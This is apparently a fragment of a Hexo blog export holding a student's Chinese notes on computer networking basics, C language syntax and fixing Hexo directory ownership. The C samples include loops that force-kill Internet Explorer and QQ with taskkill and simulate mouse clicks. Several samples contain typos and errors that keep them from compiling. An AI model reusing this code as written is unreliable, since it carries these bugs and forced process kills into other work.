id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h2>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>network2</title>
      <link href="/2019/09/15/network2/"/>
      <url>/2019/09/15/network2/</url>
      
        <content type="html"><![CDATA[<h1 id="物理层基本概念"><a href="#物理层基本概念" class="headerlink" title="物理层基本概念"></a>物理层基本概念</h1><ul><li>解决在各种计算机传输媒体上传输数据比特流</li><li>主要任务描述为确定与传输媒体接口的一些特性</li></ul><table><thead><tr><th>特性</th><th>举例</th></tr></thead><tbody><tr><td>机械特性</td><td>接口形状大小，引线数目</td></tr><tr><td>电气特性</td><td>规定电压范围</td></tr><tr><td>功能特性</td><td>规定-5V表示0,5V表示1</td></tr><tr><td>过程特性</td><td>规定建立连接时各个相关部件工作的步骤</td></tr></tbody></table><h2 id="数据通信的基础知识"><a href="#数据通信的基础知识" class="headerlink" title="数据通信的基础知识"></a>数据通信的基础知识</h2><h3 id="典型的数据通信模型"><a href="#典型的数据通信模型" class="headerlink" title="典型的数据通信模型"></a>典型的数据通信模型</h3><ol><li>PC机将文字转换为数字比特流</li><li>调制解调器将数字比特流转换为模拟信号</li><li>模拟信号传入公共电话网到达目标调制解调器下</li><li>调制解调器将模拟信号转换回数字比特流</li><li>目标PC机将数字比特流转换为显示汉字</li></ol><h3 id="几个概念解析"><a href="#几个概念解析" class="headerlink" title="几个概念解析"></a>几个概念解析</h3><p>模拟信号：代表消息的参数的取值是连续的</p><p>数字信号：代表消息的参数的取值是离散的</p><p>码元code：在使用时间域的波形表示数字信号时，则代表不同离散数值的基本波形就成为码元。</p><p>在数字通信中常常使用时间间隔相同的符号来表示一个二进制数字，这样的时间间隔内的信号成为二进制的码元。而这个间隔的长度被称为码元长度。1码元可以携带nbit的信息量。</p><h3 id="信道的几个基本概念"><a href="#信道的几个基本概念" class="headerlink" title="信道的几个基本概念"></a>信道的几个基本概念</h3><p>信道一般表示向一个方向传送信息的媒体，所以平常的通信路线往往包含一条发送信息的信道和一条接受信息的信道</p><p>单向通信（单工通信）——只能有一个方向的通信而没有反方向的交互。</p><ul><li>电视</li><li>广播</li></ul><p>双向交替通信（半双工通信）——通信的双方都可以发送信息，但不能同时发送（也不能同时接收）</p><ul><li>对讲机</li></ul><p>双向同时通信（全双工通信）——通信双方可以同时发送和接收信息</p><h3 id="基带（baseband）信号和带通-band-pass-信号"><a href="#基带（baseband）信号和带通-band-pass-信号" class="headerlink" title="基带（baseband）信号和带通(band pass)信号"></a>基带（baseband）信号和带通(band pass)信号</h3><p>基带信号（基本频带信号）——来自信源的信号。发出的直接表达要传输信息的信号。传播距离较近，远距离失真。</p><p>带通信号——把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道）。 远距传播减少信号衰减。</p><h3 id="调制方法"><a href="#调制方法" class="headerlink" title="调制方法"></a>调制方法</h3><ul><li>调幅（AM）</li><li>调频（FM）</li><li>调相（PM）</li></ul><h3 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h3><ul><li>单极性不归零码（高电压1，没电压0）</li><li>双极性不归零码（正负电平分别表01，正负值相等）</li><li>双极性归零码（正负零三个电平，信号本身携带同步信息）</li><li>曼彻斯特编码（相同单位时间，由低到高代表0，由高到低代表1，必须经过两次采样才能得到1bit数据。可携带时钟信号，可以表示没信号传输）</li><li>差分曼彻斯特编码（bit中间有信号跳变，bit与bit之间也有信号跳变，表示下一个bit为0。bit中间有信号跳变，bit与bit之间无信号跳变，表示下一个bit为1。性能与曼彻斯特编码相同，抗干扰能力强）</li></ul><h3 id="信道的极限容量"><a href="#信道的极限容量" class="headerlink" title="信道的极限容量"></a>信道的极限容量</h3><p>实际信道传输中带宽受限，有噪声，干扰，失真，可能发生信号的波形变化。</p><ul><li>有失真可识别</li><li>不可识别</li></ul><h3 id="奈氏准则"><a href="#奈氏准则" class="headerlink" title="奈氏准则"></a>奈氏准则</h3><ul><li>作用：假定理想状态下，为了避免码间串扰，码元的传输速率的上限值。</li><li>原因：任何信道中，码元传输的速率是用上限的，否则就会出现码间串扰的问题，使接收端对码元的判决（即识别）成为不可能。</li><li>理想低通信道的最高码元传输速率&#x3D;2WBaud<ul><li>W是理想低通信道的带宽，单位Hz</li><li>Baud是波特，是码元传输速率的单位。如果一个码元含有3个bit信息量，1波特&#x3D;3bit&#x2F;s</li></ul></li></ul><h3 id="信噪比"><a href="#信噪比" class="headerlink" title="信噪比"></a>信噪比</h3><p>香农用信息论的理论推导出了带宽受限且有高斯白噪声干扰的信道的极限，无差错的信息传输速率。</p><p>信道的极限信息传输速率C&#x3D; Wlog2(1+S&#x2F;N)   单位b&#x2F;s</p><ul><li>W 为信道的带宽（Hz）</li><li>S 为信道内所传信号的平均功率</li><li>N 为信道内部的高斯噪声功率</li><li>上面的公式是香农公式</li></ul><p>其中的C不可能无限大，因为N不可能很小<br>S&#x2F;N 为信噪比</p><h3 id="奈氏准则和香农公式适用范围"><a href="#奈氏准则和香农公式适用范围" class="headerlink" title="奈氏准则和香农公式适用范围"></a>奈氏准则和香农公式适用范围</h3><p>——-&gt; 源点———&gt;发送器———&gt;传输系统——–&gt;接收器——-&gt;终点——&gt;<br>输入信息　　输入数据　　发送信号　　　接收信号  　　输出数据　 输出信息</p><p>发送信号到接收信号的过程码元传输速率受奈氏准则的限制</p><p>输入数据到输出数据之间信息传输速率受香农公式限制</p><h2 id="传输媒体"><a href="#传输媒体" class="headerlink" title="传输媒体"></a>传输媒体</h2><h3 id="电磁波"><a href="#电磁波" class="headerlink" title="电磁波"></a>电磁波</h3><h3 id="导向传播媒体"><a href="#导向传播媒体" class="headerlink" title="导向传播媒体"></a>导向传播媒体</h3><h4 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h4><ul><li>屏蔽双绞线STP</li><li>非屏蔽双绞线UTP</li></ul><h4 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h4><ul><li>50Ω 用于数字传输</li><li>75Ω 用于模拟传输</li></ul><h4 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h4><ul><li>单模光纤 </li><li>多模光纤</li></ul><h3 id="非导向传输媒体"><a href="#非导向传输媒体" class="headerlink" title="非导向传输媒体"></a>非导向传输媒体</h3><h4 id="短波通信"><a href="#短波通信" class="headerlink" title="短波通信"></a>短波通信</h4><ul><li>依靠电离层反射</li></ul><h4 id="微波通信"><a href="#微波通信" class="headerlink" title="微波通信"></a>微波通信</h4><ul><li>直线传播</li><li>依靠卫星和地面信号塔</li></ul><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><ul><li>有放大信号的作用和重发作用</li><li>半双通</li><li>有冲突域</li><li>不安全</li><li>数量越多带宽越少</li></ul><h3 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h3><h4 id="频分复用"><a href="#频分复用" class="headerlink" title="频分复用"></a>频分复用</h4><ul><li>每个用户固定频率</li><li>不同频率调制</li><li>信号复用</li><li>传输完成后拆分</li></ul><h4 id="时分复用"><a href="#时分复用" class="headerlink" title="时分复用"></a>时分复用</h4><ul><li>每个设备设定时间段</li><li>按顺序收按顺序发</li><li>缺点：可能有空数据</li></ul><h4 id="统计时分复用"><a href="#统计时分复用" class="headerlink" title="统计时分复用"></a>统计时分复用</h4><ul><li>不同用户用不同标记</li></ul><h4 id="波分复用"><a href="#波分复用" class="headerlink" title="波分复用"></a>波分复用</h4><h4 id="码分复用"><a href="#码分复用" class="headerlink" title="码分复用"></a>码分复用</h4><ul><li>简称 CDMA</li><li>频率相同的信号都可以接收，但是不同用户使用不同的码型不会干扰</li><li>码片：每一个比特时间划分为m个短的间隔</li><li>利用正交向量的规则，保证格式化内积值只有1,-1,0。且无关码片的值一定是0</li></ul><h3 id="数字传输系统"><a href="#数字传输系统" class="headerlink" title="数字传输系统"></a>数字传输系统</h3><ul><li>电话局之间的中继线上传送多路的电话</li><li>脉码调制PCM<ul><li>北美T1</li><li>欧洲E1</li></ul></li></ul><h3 id="宽带接入技术"><a href="#宽带接入技术" class="headerlink" title="宽带接入技术"></a>宽带接入技术</h3><h4 id="xDSL"><a href="#xDSL" class="headerlink" title="xDSL"></a>xDSL</h4><ul><li>用不同频率传不同的信号</li><li>低频给电话</li><li>高频留给上网</li></ul><h4 id="光纤同轴混合网HFC"><a href="#光纤同轴混合网HFC" class="headerlink" title="光纤同轴混合网HFC"></a>光纤同轴混合网HFC</h4><h4 id="FTTx技术"><a href="#FTTx技术" class="headerlink" title="FTTx技术"></a>FTTx技术</h4><ul><li>光纤到户</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>network1</title>
      <link href="/2019/09/15/network1/"/>
      <url>/2019/09/15/network1/</url>
      
        <content type="html"><![CDATA[<h1 id="互联网（internet）"><a href="#互联网（internet）" class="headerlink" title="互联网（internet）"></a>互联网（internet）</h1><ul><li>多个计算机网络连接</li></ul><h1 id="因特网（Internet）"><a href="#因特网（Internet）" class="headerlink" title="因特网（Internet）"></a>因特网（Internet）</h1><ul><li>用TCP&#x2F;IP协议的连接的一种互联网</li></ul><h2 id="三个阶段"><a href="#三个阶段" class="headerlink" title="三个阶段"></a>三个阶段</h2><ol><li>ARPANET向互联网发展</li><li>三级网络结构的因特网</li><li>多层次的ISP结构的因特网<ul><li>ISP 相当于运营商</li></ul></li></ol><h2 id="因特网的标准化工作"><a href="#因特网的标准化工作" class="headerlink" title="因特网的标准化工作"></a>因特网的标准化工作</h2><h2 id="因特网组成"><a href="#因特网组成" class="headerlink" title="因特网组成"></a>因特网组成</h2><h3 id="网络边缘区域"><a href="#网络边缘区域" class="headerlink" title="网络边缘区域"></a>网络边缘区域</h3><h4 id="C-S"><a href="#C-S" class="headerlink" title="C-S"></a>C-S</h4><ul><li>客户端请求服务器</li></ul><h4 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h4><ul><li>对等连接方式</li><li>既是服务器又是客户端</li></ul><h3 id="网络核心部分"><a href="#网络核心部分" class="headerlink" title="网络核心部分"></a>网络核心部分</h3><h4 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h4><ol><li>交换过程<ul><li>交换机链接</li><li>建立连接</li><li>交换</li><li>释放</li></ul></li><li>特点<ul><li>适用于大量的实时性传输</li><li>核心路由器间可进行电路交换</li></ul></li></ol><h4 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h4><ol><li>过程<ul><li>发送端报文分组</li><li>接收端去掉首部接收数据</li></ul></li><li>特点<ul><li>不需要特定的路径</li><li>动态选择特定路径</li></ul></li><li>缺点<ul><li>时延</li><li>开销</li></ul></li></ol><h4 id="报文交换"><a href="#报文交换" class="headerlink" title="报文交换"></a>报文交换</h4><h2 id="计算机网络分类"><a href="#计算机网络分类" class="headerlink" title="计算机网络分类"></a>计算机网络分类</h2><h3 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h3><ul><li>广域网(WAN)<ul><li>花钱买服务 </li><li>花钱买带宽</li></ul></li><li>城域网(MAN)</li><li>局域网(LAN)<ul><li>自己买设备自己维护</li></ul></li></ul><h3 id="分类方式"><a href="#分类方式" class="headerlink" title="分类方式"></a>分类方式</h3><ul><li>不依赖距离判断，依赖的是是否使用了相关的技术（局域网 or 广域网技术）</li></ul><h3 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h3><ul><li>总线型</li><li>环形</li><li>星型</li><li>树型</li><li>网状</li></ul><h3 id="使用者"><a href="#使用者" class="headerlink" title="使用者"></a>使用者</h3><ul><li>公用网</li><li>专用网</li></ul><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><ul><li>资源子网</li><li>通信子网</li><li>接入网</li></ul><h3 id="交换方式"><a href="#交换方式" class="headerlink" title="交换方式"></a>交换方式</h3><ul><li>电路交换网</li><li>报文交换网</li><li>分组交换网</li></ul><h2 id="网络的性能指标"><a href="#网络的性能指标" class="headerlink" title="网络的性能指标"></a>网络的性能指标</h2><h3 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h3><ul><li>连接在计算机网络的主机上的数字信道上传送数据位数的速率</li></ul><h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><ul><li>数据通信中数据信道所能传送的最高速率</li></ul><h3 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h3><ul><li>单位时间通过某个网络的数据量</li></ul><h3 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h3><ul><li>发送时延<ul><li>发送时延 &#x3D; 数据块长度（bit）&#x2F; 信道带宽（bit&#x2F;s)</li></ul></li><li>传播时延<ul><li>传播时延 &#x3D; 信道长度（米）&#x2F; 信号在信道上的传播速率（米&#x2F;秒)</li></ul></li><li>处理时延<ul><li>网络结点存储转发处理时间</li></ul></li><li>排队时延<ul><li>网络结点缓存队列排队事件</li></ul></li></ul><h3 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h3><ul><li>时延带宽积 &#x3D; 传播时延 * 带宽</li><li>数据链路上能够承载的数据量</li></ul><h3 id="往返时间"><a href="#往返时间" class="headerlink" title="往返时间"></a>往返时间</h3><ul><li>从发送方发送数据到发送方收到接收方确认</li></ul><h3 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h3><ul><li>信道利用率<ul><li>信道利用率 &#x3D; 有数据通过时间 &#x2F; (有 + 无）数据通过时间</li></ul></li><li>网络利用率<ul><li>信道利用率加权平均值</li><li>D &#x3D; D0&#x2F;(1-U)<ul><li>D0表示网络空闲时的时延</li><li>D表示网络当前的时延</li><li>U表示信道的利用率</li></ul></li></ul></li></ul><h2 id="计算机网络非性能指标"><a href="#计算机网络非性能指标" class="headerlink" title="计算机网络非性能指标"></a>计算机网络非性能指标</h2><ul><li>费用</li><li>质量</li><li>标准化</li><li>可靠性</li><li>可扩展性</li><li>可升级性</li><li>管理与维护</li></ul><h2 id="计算机网络的体系结构"><a href="#计算机网络的体系结构" class="headerlink" title="计算机网络的体系结构"></a>计算机网络的体系结构</h2><ul><li>计算机网络各层及其协议的集合</li></ul><h3 id="ISO-国际标准化组织"><a href="#ISO-国际标准化组织" class="headerlink" title="ISO 国际标准化组织"></a>ISO 国际标准化组织</h3><h3 id="OSI-RM-互联网法律上的国际标准"><a href="#OSI-RM-互联网法律上的国际标准" class="headerlink" title="OSI&#x2F;RM 互联网法律上的国际标准"></a>OSI&#x2F;RM 互联网法律上的国际标准</h3><ul><li>网络排错应该从底层得到高层</li><li>网络安全和OSI参考模型<ul><li>物理层安全</li><li>数据链路层安全 ADSL AP密码</li><li>网络层安全</li><li>应用层安全 SQl注入漏洞 上传漏洞</li></ul></li></ul><h4 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h4><ul><li>应用层</li><li>能够产生流量</li><li>能够和用户交互的应用程序</li></ul><h4 id="Presentation"><a href="#Presentation" class="headerlink" title="Presentation"></a>Presentation</h4><ul><li>表示层</li><li>加密 压缩</li><li>开发人员考虑的问题</li></ul><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><ul><li>会话层</li><li>服务端和客户端建立的对话</li><li>可以查木马 netstat -nb</li></ul><h4 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h4><ul><li>传输层</li><li>可靠传输建立会话</li><li>不可靠传输不建立会话 QQ，广播，百度</li><li>流量控制</li></ul><h4 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h4><ul><li>网络层</li><li>IP地址编址 选择最佳路径</li></ul><h4 id="Data-Link"><a href="#Data-Link" class="headerlink" title="Data Link"></a>Data Link</h4><ul><li>数据链路层</li><li>数据如何封装</li><li>添加物理层地址  MAC</li></ul><h4 id="Physical"><a href="#Physical" class="headerlink" title="Physical"></a>Physical</h4><ul><li>物理层 </li><li>电压</li><li>接口标准</li></ul><h3 id="TCP-IP-Suite-因特网事实上的国际标准"><a href="#TCP-IP-Suite-因特网事实上的国际标准" class="headerlink" title="TCP&#x2F;IP Suite 因特网事实上的国际标准"></a>TCP&#x2F;IP Suite 因特网事实上的国际标准</h3><ul><li>TCP&#x2F;IP 四层模型</li></ul><h4 id="Application-1"><a href="#Application-1" class="headerlink" title="Application"></a>Application</h4><ul><li>相当于OSI的前三层</li></ul><h4 id="Transport-1"><a href="#Transport-1" class="headerlink" title="Transport"></a>Transport</h4><h4 id="Internet"><a href="#Internet" class="headerlink" title="Internet"></a>Internet</h4><h4 id="Network-Access"><a href="#Network-Access" class="headerlink" title="Network Access"></a>Network Access</h4><ul><li>相当于数据链路层加物理层</li></ul><h3 id="Network-Protocols-数据交换遵守的规则-标准或约定"><a href="#Network-Protocols-数据交换遵守的规则-标准或约定" class="headerlink" title="Network Protocols 数据交换遵守的规则,标准或约定"></a>Network Protocols 数据交换遵守的规则,标准或约定</h3><h3 id="开放式系统互联"><a href="#开放式系统互联" class="headerlink" title="开放式系统互联"></a>开放式系统互联</h3><ol><li>概念<ul><li>实体 entity<ul><li>交换信息的硬件或软件进程</li></ul></li><li>协议 protocol<ul><li>控制两个对等实体通信的规则</li></ul></li><li>服务 service<ul><li>下层向上层提供服务，上层需要使用下层提供的服务来实现本层功能</li></ul></li><li>访问点 SAP<ul><li>相邻两层实体间交换信息的地方</li></ul></li></ul></li></ol><h3 id="本书的五层协议"><a href="#本书的五层协议" class="headerlink" title="本书的五层协议"></a>本书的五层协议</h3><table><thead><tr><th>层次</th><th>传送内容</th><th>相对上层增加内容</th></tr></thead><tbody><tr><td>应用层</td><td>传输数据单元PDU</td><td></td></tr><tr><td>运输层</td><td>运输层报文</td><td>PDU+运输层首部</td></tr><tr><td>网络层</td><td>IP数据报(IP分组)</td><td>+网络层首部</td></tr><tr><td>数据链路层</td><td>数据帧</td><td>+链路层首部+链路层尾部</td></tr><tr><td>物理层</td><td>bit</td><td>转比特流</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning8</title>
      <link href="/2019/09/07/CLearning8/"/>
      <url>/2019/09/07/CLearning8/</url>
      
        <content type="html"><![CDATA[<h1 id="for-的循环条件"><a href="#for-的循环条件" class="headerlink" title="for 的循环条件"></a>for 的循环条件</h1><ul><li>三个表达式<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(表达式1;表达式2;表达式3)</span><br><span class="line">//表达式1初始化</span><br><span class="line">//表达式2循环判断条件</span><br><span class="line">//表达式3循环最后执行条件</span><br></pre></td></tr></table></figure></li><li>中间的表达式为空或者非零是类似与while(1)的无限循环</li><li>无表达式1和3等价于while语句</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning7</title>
      <link href="/2019/09/05/CLearning7/"/>
      <url>/2019/09/05/CLearning7/</url>
      
        <content type="html"><![CDATA[<h1 id="bool类型"><a href="#bool类型" class="headerlink" title="bool类型"></a>bool类型</h1><ul><li>C++有bool类型的变量，C语言没有。</li><li>C中bool类型可以用char和int类型代替</li></ul><h1 id="块语句"><a href="#块语句" class="headerlink" title="块语句"></a>块语句</h1><ul><li>用大括号包起来的语句块</li><li>C中块语句定义的变量单独开辟一块内存空间，作为局部变量。而且块语句外可以定义同名变量</li><li>同一块语句中变量不能重名</li></ul><h1 id="算法表示"><a href="#算法表示" class="headerlink" title="算法表示"></a>算法表示</h1><ul><li>伪代码法<ul><li>算法不能有二义性</li></ul></li><li>流程图法<ul><li>起止框椭圆形</li><li>输入输出框平行四边形</li><li>处理框正方形完成某些操作</li><li>判断框菱形</li><li>连接点小圆流程图太大则用于分解连接</li><li>流程线带箭头线表示执行方向</li></ul></li></ul><h1 id="结构化程序设计"><a href="#结构化程序设计" class="headerlink" title="结构化程序设计"></a>结构化程序设计</h1><ul><li>分治思想<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">void openBaidu()&#123;</span><br><span class="line">ShellExecuteA(0,&quot;open&quot;,&quot;http://www.baidu.com&quot;,0)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void closeBaidu()&#123;</span><br><span class="line">system(&quot;taskkill /f /im iexplore.exe&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void clickBaidu()&#123;</span><br><span class="line">SetCursorPos(40,40);//设置鼠标位置</span><br><span class="line">Sleep(5000);</span><br><span class="line">mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);//鼠标左键按下</span><br><span class="line">mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);//鼠标左键弹起</span><br><span class="line">mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);//鼠标左键按下</span><br><span class="line">mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);//鼠标左键弹起</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">while(1)&#123;</span><br><span class="line">openBaidu();</span><br><span class="line">Sleep(5000);</span><br><span class="line">clickBaidu();</span><br><span class="line">Sleep(5000);</span><br><span class="line">closeBaidu();</span><br><span class="line">Sleep(1000);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>通过不同的函数实现不同的功能，面向对象是对分治最好的体现。</li></ul><h1 id="windows输入输出"><a href="#windows输入输出" class="headerlink" title="windows输入输出"></a>windows输入输出</h1><ul><li>cmd中切换到操作目录</li><li>ipconfig&lt;0.txt&gt;10.txt</li><li>上一步操作会将0.txt中的操作输入到ipconfig中（实际上没有做任何事）之后将ipconfig中的内容输入到10.txt中</li><li>在windows做这个操作会会覆盖之前的文档内容，Ubuntu中只是添加内容。</li><li>ubuntu的命令行操作不同例如查询ip：ifconfig&gt;&gt;10.txt</li></ul><h1 id="if选择分支结构"><a href="#if选择分支结构" class="headerlink" title="if选择分支结构"></a>if选择分支结构</h1><ul><li>可以嵌套，但是还是容易乱建议减少嵌套，而是单独设计函数，这样简介清晰</li><li>if else嵌套时注意一定要配套，不要漏写，多写。</li></ul><h1 id="switch-case多分支选择语句"><a href="#switch-case多分支选择语句" class="headerlink" title="switch case多分支选择语句"></a>switch case多分支选择语句</h1><ul><li>case 后的常量值不能重合</li><li>多个case可以共用一个语句块</li><li>default分支不限定在最后，内部任何分支没有先后顺序。</li><li>case相当一个开关，如果不加break会一直执行下去。</li><li>不加break说明你希望连续执行多个分支</li><li>switch语句一般用于处理枚举类型数据</li><li>switch的表达式只能是整数或者字符，只能用于处理常量（因为case中只能是常量，只能判断相等）</li></ul><h1 id="循环实现移动窗口"><a href="#循环实现移动窗口" class="headerlink" title="循环实现移动窗口"></a>循环实现移动窗口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#incldue&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">void openQQ()&#123;</span><br><span class="line">ShellExecuteA(0,&quot;open&quot;,&quot;\&quot;C:\\Program File (x86)\\Tencent\\QQ....QQ的位置&quot;,0,0,1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void moveQQ()&#123;</span><br><span class="line">HWND win = FindWindowA(&quot;TXGuiFoundation&quot;,&quot;QQ2013&quot;);//HWND QQ窗口编号</span><br><span class="line">//FindWindowA根据类名和标题寻找窗口</span><br><span class="line">if(win == NULL)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;QQ失踪&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int y =0;</span><br><span class="line">while(i &lt; 900)</span><br><span class="line">&#123;</span><br><span class="line">SetWindowPos(win,NULL,y*16/9,y,400,400,0);//设置窗口大小，以及窗口位置</span><br><span class="line">Sleep(50)</span><br><span class="line">y += 10;</span><br><span class="line">if(y/10%2==1)&#123;</span><br><span class="line">ShowWindow(win,SW_HIDE);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">ShowWindow(win,SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void main()&#123;</span><br><span class="line">system(&quot;taskkill /f /im QQ.exe);</span><br><span class="line">openQQ();</span><br><span class="line">Sleep(5000);</span><br><span class="line">moveQQ();</span><br><span class="line">Sleep(5000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C,C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>noroot</title>
      <link href="/2019/09/04/noroot/"/>
      <url>/2019/09/04/noroot/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo不用root用户登录"><a href="#hexo不用root用户登录" class="headerlink" title="hexo不用root用户登录"></a>hexo不用root用户登录</h1><ul><li>hexoblog搭建是在root权限下进行的，之后的每一个操作也是用root用户进行感觉很麻烦，所以决定改变一下</li></ul><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ul><li>将hexo的目录改成用户作为拥有者<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">which hexo//查看hexo位置，一般是软连接，看真正的hexo位置</span><br><span class="line">//将hexo文件夹全部改成用户的</span><br><span class="line">sudo chown -R 用户的用户名 hexo-cli所在位置（一般是这个文件夹）</span><br><span class="line">//再将blog所在目录全改了</span><br><span class="line">//切换到博客目录</span><br><span class="line">cd blog目录</span><br><span class="line">sudo chown -R 用户的用户名 ../blog目录</span><br><span class="line">//这样以后说明操作都不能用sudo！！！否则又会创建root用户文件导致需要再修改blog目录</span><br></pre></td></tr></table></figure></li><li>切记不能在用sudo命令使用hexo，否者又会需要改blog目录下的所有者</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning6</title>
      <link href="/2019/09/04/CLearning6/"/>
      <url>/2019/09/04/CLearning6/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言printf"><a href="#C语言printf" class="headerlink" title="C语言printf"></a>C语言printf</h1><ul><li>八进制%o</li><li>十进制%d</li><li>十六进制%x</li></ul><h1 id="C语言打印二进制"><a href="#C语言打印二进制" class="headerlink" title="C语言打印二进制"></a>C语言打印二进制</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS//关闭安全检查</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">int num =12312;</span><br><span class="line">char str[32];</span><br><span class="line">_itoa_s(num,str,32,2);//最后一位传参定义转换为几进制</span><br><span class="line">printf(&quot;%s&quot;,str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="显示极大极小值"><a href="#显示极大极小值" class="headerlink" 